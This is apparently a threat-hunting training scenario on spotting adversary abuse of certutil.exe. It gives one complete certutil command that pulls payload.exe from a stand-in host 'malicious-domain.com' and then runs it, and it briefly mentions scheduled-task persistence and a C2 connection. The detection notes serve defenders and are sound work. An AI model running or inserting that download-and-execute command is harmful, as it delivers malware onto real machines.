# Threat Hunt Scenario: Suspicious Use of Certutil for Payload Download

## üîç Threat Event: Suspicious Use of Certutil
**Description:**  
Adversaries used `certutil.exe`, a known Living Off the Land Binary (LOLBIN), to download and execute a suspicious payload.

---

## üéØ Reason for Threat Hunt

- **Trigger:**  
  Security team received an alert from the firewall indicating an outbound connection to a known malware-hosting domain.

- **Context:**  
  Certutil abuse for downloading files has been highlighted in recent cybersecurity advisories and APT threat intelligence feeds.  
  (Reference: [MITRE ATT&CK T1105 ‚Äì Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/))

- **Directive:**  
  Management requested a proactive hunt for any endpoints using LOLBINs like `certutil.exe` for unauthorized downloads.

## üß™ Steps Taken by the "Bad Actor" ‚Äì Logs & IoCs

1. **Command Shell Opened (CMD/PowerShell)**
2. **Payload Downloaded Using Certutil:**

```bash
certutil -urlcache -split -f http://malicious-domain.com/payload.exe C:\Users\Public\payload.exe
```
3. **Payload Executed:**

```vbnet
Copy
Edit
C:\Users\Public\payload.exe
```
4. **Persistence Established:**
Created a malicious scheduled task for persistence.

5. **C2 Connection Established:**
Connected to a remote Command and Control server on port 443.

üìé Notes
Monitor use of certutil.exe with suspicious flags (-urlcache, -split, -f).

Prioritize endpoints with public folder .exe executions followed by outbound traffic.

‚úÖ Hunting Goal: Identify and contain endpoints abusing certutil to fetch and launch malicious executables.
